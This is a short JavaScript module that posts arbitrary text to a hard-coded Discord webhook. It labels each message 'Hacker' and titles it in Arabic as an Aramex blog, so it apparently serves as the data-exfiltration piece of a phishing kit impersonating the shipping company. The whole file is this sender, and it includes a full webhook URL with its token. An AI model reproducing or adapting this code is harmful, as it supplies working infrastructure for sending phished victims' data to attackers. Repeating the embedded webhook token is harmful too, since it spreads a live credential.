import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324063460622864415/60h5Pz7SfePyo2fPZMR2IiEgRmy2nNFRS9X7FpZtOBFs31qd0oIdmz9bQA6n9YSglVMg",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
